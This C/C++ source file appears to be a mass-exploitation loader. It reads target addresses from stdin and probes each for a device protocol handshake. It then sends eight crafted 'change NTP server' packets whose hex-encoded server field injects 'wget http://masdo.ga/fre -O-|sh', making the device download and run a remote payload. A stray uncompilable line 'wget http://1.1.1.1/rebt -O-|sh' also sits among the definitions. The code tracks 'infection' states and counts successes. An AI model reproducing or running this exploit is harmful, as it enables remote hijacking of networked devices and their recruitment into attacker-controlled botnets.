#include <stdio.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/epoll.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include <time.h>
#include <glob.h>
#include <string>
#include <sstream>
#include <vector>
#include <fstream>
#include <stdarg.h>

#include "utils.h"

#define VERISON_REQUEST "\x5a\xa5\x01\x20\x00\x00\x00\x00"

#define CHANGE_NTP_COMMAND "\x5a\xa5\x06\x15\x00\x00\x00\x98\x00\x00\x00"
#define AUTH_BYTE "\x62"
#define NTP_SERVER "GMT+09:00 Seoultime.nist.gov&"
#define COMMAND_CLOSE_BYTE "\x02"

// payload must be no more than 31 bytes, if it is any less put semicolon!
// run python payload creator and paste output here
wget http://1.1.1.1/rebt -O-|sh
const char *payloads[8] = 
{
    "\x5a\xa5\x06\x15\x00\x00\x00\x98\x00\x00\x00\x62\x00\x00\x00\x00\x00\x00\x00\x00\x47\x4d\x54\x2b\x30\x39\x3a\x30\x30\x20\x53\x65\x6f\x75\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x74\x69\x6d\x65\x2e\x6e\x69\x73\x74\x2e\x67\x6f\x76\x26\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x6d\x61\x73\x64\x6f\x2e\x67\x61\x2f\x66\x72\x65\x20\x2d\x4f\x2d\x7c\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00",
    "\x5a\xa5\x06\x15\x00\x00\x00\x98\x00\x00\x00\x69\x00\x00\x00\x00\x00\x00\x00\x00\x47\x4d\x54\x2b\x30\x39\x3a\x30\x30\x20\x53\x65\x6f\x75\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x74\x69\x6d\x65\x2e\x6e\x69\x73\x74\x2e\x67\x6f\x76\x26\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x6d\x61\x73\x64\x6f\x2e\x67\x61\x2f\x66\x72\x65\x20\x2d\x4f\x2d\x7c\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00",
    "\x5a\xa5\x06\x15\x00\x00\x00\x98\x00\x00\x00\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x47\x4d\x54\x2b\x30\x39\x3a\x30\x30\x20\x53\x65\x6f\x75\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x74\x69\x6d\x65\x2e\x6e\x69\x73\x74\x2e\x67\x6f\x76\x26\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x6d\x61\x73\x64\x6f\x2e\x67\x61\x2f\x66\x72\x65\x20\x2d\x4f\x2d\x7c\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00",
    "\x5a\xa5\x06\x15\x00\x00\x00\x98\x00\x00\x00\x52\x00\x00\x00\x00\x00\x00\x00\x00\x47\x4d\x54\x2b\x30\x39\x3a\x30\x30\x20\x53\x65\x6f\x75\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x74\x69\x6d\x65\x2e\x6e\x69\x73\x74\x2e\x67\x6f\x76\x26\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x6d\x61\x73\x64\x6f\x2e\x67\x61\x2f\x66\x72\x65\x20\x2d\x4f\x2d\x7c\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00",
    "\x5a\xa5\x06\x15\x00\x00\x00\x98\x00\x00\x00\x44\x00\x00\x00\x00\x00\x00\x00\x00\x47\x4d\x54\x2b\x30\x39\x3a\x30\x30\x20\x53\x65\x6f\x75\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x74\x69\x6d\x65\x2e\x6e\x69\x73\x74\x2e\x67\x6f\x76\x26\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x6d\x61\x73\x64\x6f\x2e\x67\x61\x2f\x66\x72\x65\x20\x2d\x4f\x2d\x7c\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00",
    "\x5a\xa5\x06\x15\x00\x00\x00\x98\x00\x00\x00\x67\x00\x00\x00\x00\x00\x00\x00\x00\x47\x4d\x54\x2b\x30\x39\x3a\x30\x30\x20\x53\x65\x6f\x75\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x74\x69\x6d\x65\x2e\x6e\x69\x73\x74\x2e\x67\x6f\x76\x26\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x6d\x61\x73\x64\x6f\x2e\x67\x61\x2f\x66\x72\x65\x20\x2d\x4f\x2d\x7c\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00",
    "\x5a\xa5\x06\x15\x00\x00\x00\x98\x00\x00\x00\x43\x00\x00\x00\x00\x00\x00\x00\x00\x47\x4d\x54\x2b\x30\x39\x3a\x30\x30\x20\x53\x65\x6f\x75\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x74\x69\x6d\x65\x2e\x6e\x69\x73\x74\x2e\x67\x6f\x76\x26\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x6d\x61\x73\x64\x6f\x2e\x67\x61\x2f\x66\x72\x65\x20\x2d\x4f\x2d\x7c\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00",
    "\x5a\xa5\x06\x15\x00\x00\x00\x98\x00\x00\x00\x4D\x00\x00\x00\x00\x00\x00\x00\x00\x47\x4d\x54\x2b\x30\x39\x3a\x30\x30\x20\x53\x65\x6f\x75\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x74\x69\x6d\x65\x2e\x6e\x69\x73\x74\x2e\x67\x6f\x76\x26\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x6d\x61\x73\x64\x6f\x2e\x67\x61\x2f\x66\x72\x65\x20\x2d\x4f\x2d\x7c\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00",
};

utils util;

typedef char BOOL;

#define TRUE 1
#define FALSE 0

int _found = 0;
int _connected = 0;
int _success = 0;

enum
{
    // Maxes
    MAX_EVENTS = 1000000,
    
    // States
    CONNECTION_CLOSED = 0,
    CONNECTION_CHECK_REQUEST = 1,
    CONNECTION_ATTEMPT_INFECTION = 3,

    // Timeouts
    CONNECT_TIMEOUT = 10,
};

struct target
{
    uint32_t addr;
    uint16_t port;
};

struct connections
{
    uint32_t addr;
    uint16_t port;
    uint8_t state;
    char connected;
    uint32_t timeout;
    uint8_t wait;
    uint8_t index;
    int fd;
};

int epoll_fd = -1;
struct epoll_event *epoll_event_list;
struct connections *connections_list;

static void establish_connection(uint32_t target, uint16_t port, uint8_t state, uint8_t index)
{
    struct sockaddr_in addr;
    struct epoll_event event;
    int fd = -1;

    // Build the TCP socket
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd == -1)
    {
        //printf("Failed to build the socket?\n");
        return;
    }

    // Build the addr
    addr.sin_family = AF_INET;
    addr.sin_port = port;
    addr.sin_addr.s_addr = target;

    // Put the socket into non-blocking mode
    fcntl(fd, F_SETFL, O_NONBLOCK);

    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    event.data.fd = fd;
    event.events = EPOLLOUT | EPOLLET;

    if(epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &event) == -1)
    {
        close(fd);
        return;
    }

    connections_list[event.data.fd].addr = target;
    connections_list[event.data.fd].port = port;
    connections_list[event.data.fd].connected = 0;
    connections_list[event.data.fd].timeout = time(NULL);
    connections_list[event.data.fd].wait = 40;
    connections_list[event.data.fd].fd = event.data.fd;
    connections_list[event.data.fd].state = state;
    connections_list[event.data.fd].index = index;

    return;
}

static void reset_state(struct connections *ptr)
{
	if(ptr->fd)
		close(ptr->fd);

	ptr->fd = -1;

    // Remove the FD from the epoll event list
    if(!epoll_ctl(epoll_fd, EPOLL_CTL_DEL, ptr->fd, NULL))
    {
        printf("Successfully removed the FD %d from the event list!\n", ptr->fd);
    }

    ptr->state = CONNECTION_CLOSED;
    ptr->connected = 0;
    ptr->timeout = 0;
    ptr->wait = 0;
    ptr->index = 0;
    ptr->addr = 0;
    ptr->port = 0;

    return;
}

static void process_event(struct epoll_event *event)
{
	if((event->events & EPOLLERR) || (event->events & EPOLLHUP))
    {
        reset_state(&connections_list[event->data.fd]);
        return;
    }

    if((event->events & EPOLLOUT))
    {
        int err = 0;
        socklen_t err_len = sizeof(err);
        struct epoll_event tmp;
        int sock_err = 0;

        sock_err = getsockopt(event->data.fd, SOL_SOCKET, SO_ERROR, &err, &err_len);

        if (err != 0 && sock_err != 0)
        {
            reset_state(&connections_list[event->data.fd]);
            return;
        }

        connections_list[event->data.fd].connected = 1;
        _connected++;

        if (connections_list[event->data.fd].state == CONNECTION_CHECK_REQUEST)
        {
            send(event->data.fd, "\x5a\xa5\x01\x20\x00\x00\x00\x00", 8, MSG_NOSIGNAL);
        }
        
        if (connections_list[event->data.fd].state == CONNECTION_ATTEMPT_INFECTION)
            send(event->data.fd, payloads[connections_list[event->data.fd].index], 160, 0);

        tmp.data.fd = event->data.fd;
        tmp.events = EPOLLIN | EPOLLET;
        epoll_ctl(epoll_fd, EPOLL_CTL_MOD, event->data.fd, &tmp);
        return;
    }

    if(event->events & EPOLLIN)
    {
		unsigned char in[5024] = {0};
        int ret = 0;

        ret = recv(event->data.fd, in, sizeof(in), MSG_NOSIGNAL);

        if (connections_list[event->data.fd].state == CONNECTION_CHECK_REQUEST)
        {
            if (in[0] == 90 && in[1] == 165 && in[2] == 1 && in[3] == 32)
            {
                printf("Found! %d.%d.%d.%d:%d!\n",
                    connections_list[event->data.fd].addr & 0xff, (connections_list[event->data.fd].addr >> 8) & 0xff, (connections_list[event->data.fd].addr >> 16) & 0xff, (connections_list[event->data.fd].addr >> 24) & 0xff, ntohs(connections_list[event->data.fd].port));
                
                _found++;

                //reset_state(&connections_list[event->data.fd]);

                close(event->data.fd);
                establish_connection(connections_list[event->data.fd].addr, connections_list[event->data.fd].port, CONNECTION_ATTEMPT_INFECTION, connections_list[event->data.fd].index);
            }

            reset_state(&connections_list[event->data.fd]);
            return;
        }

        if (connections_list[event->data.fd].state == CONNECTION_ATTEMPT_INFECTION)
        {
            if (connections_list[event->data.fd].index == 8)
            {
                reset_state(&connections_list[event->data.fd]);
                return;
            }

            _success++;

            close(event->data.fd);
            connections_list[event->data.fd].index++;
            establish_connection(connections_list[event->data.fd].addr, connections_list[event->data.fd].port, CONNECTION_ATTEMPT_INFECTION, connections_list[event->data.fd].index);
        }

        return;
    }

    return;
}

static void *epoll_worker(void *arg)
{
    epoll_fd = epoll_create1(0);

    if(epoll_fd == -1)
    {
        printf("bad\n");
        return NULL;
    }

    epoll_event_list = (struct epoll_event *)calloc(MAX_EVENTS, sizeof(struct epoll_event));
    if(!epoll_event_list)
    {
        close(epoll_fd);
        return NULL;
    }

    while(1)
    {
        int num_of_events = 0;
        int i = 0;

        num_of_events = epoll_wait(epoll_fd, epoll_event_list, MAX_EVENTS, -1);
        
        for(i = 0; i < num_of_events; i++)
        {
            process_event(&epoll_event_list[i]);
        }
    }

    return NULL;
}

static void parse_target(char *buf, struct target *target)
{
    uint16_t y = 0;
	std::vector<std::string> strings;
	std::string host, port;
	int i = 0;

	strings = util.split_buffer(buf, ":");

	if(strings.size() == 0)
	{
		printf("Failed to parse any data?\n");
		return;
	}

	host = strings[0];

	if(strings.size() == 1)
	{
		printf("Failed to parse the port?\n");
		return;
	}

	port = strings[1];

    y = atoi(strings[1].c_str());

    target->addr = inet_addr(host.c_str());
    target->port = htons(y);

    establish_connection(target->addr, target->port, CONNECTION_CHECK_REQUEST, 0);

    return;
}

static void *statistics(void *arg)
{
    int runtime = 0;

    while(TRUE)
    {
        printf("%ds | Connections: %d | Found: %d | Success: %d\n", runtime, _connected, _found, _success);
        runtime++;
        sleep(1);
    }
}

static void _strip(char *buf, int buf_len)
{
    int i = 0;

    for(i = 0; i < buf_len; i++)
    {
        if(buf[i] == '\n' || buf[i] == '\r')
        {
            buf[i] = 0;
        }
    }

    return;
}

static void *timeout(void *arg)
{
    while(1)
    {
        int i = 0;

        for(i = 0; i < MAX_EVENTS; i++)
        {
            if(connections_list[i].connected == 0 && connections_list[i].fd == -1 && connections_list[i].state == CONNECTION_CLOSED)
                continue;
            
            if(connections_list[i].timeout + connections_list[i].wait < time(NULL))
            {
                printf("Connection timed out! FD -> %d\n", connections_list[i].fd);

                reset_state(&connections_list[i]);
            }
        }

        sleep(1);
    }

    return NULL;
}

int main(int argc, char **args)
{
    pthread_t thread;
    int i = 0;
    pthread_t stat_thread;
    pthread_t timeout_thread;

    // Allocate memory for the connections list
    connections_list = (struct connections *)calloc(MAX_EVENTS, sizeof(struct connections));
    if(!connections_list)
    {
        return 1;
    }

    // Reset the connections list values for use later
    for(i = 0; i < MAX_EVENTS; i++)
    {
        connections_list[i].fd = -1;

        reset_state(&connections_list[i]);
    }

    pthread_create(&thread, NULL, epoll_worker, NULL);
    pthread_create(&stat_thread, NULL, statistics, NULL);
    pthread_create(&timeout_thread, NULL, timeout, NULL);

	sleep(1);

    // Keep the main thread alive
    while(1)
    {
        char buf[4096];
        struct target target;

        if(!fgets(buf, sizeof(buf), stdin))
        {
            sleep(1);
            continue;
        }

        if(strlen(buf) == 0)
        {
            //printf("Failed to parse the data from stdin!\n");
            continue;
        }

        // Strip any carriage return line feeds that may exist in the line
        _strip(buf, sizeof(buf));

        parse_target(buf, &target);
    }

    return 0;
}
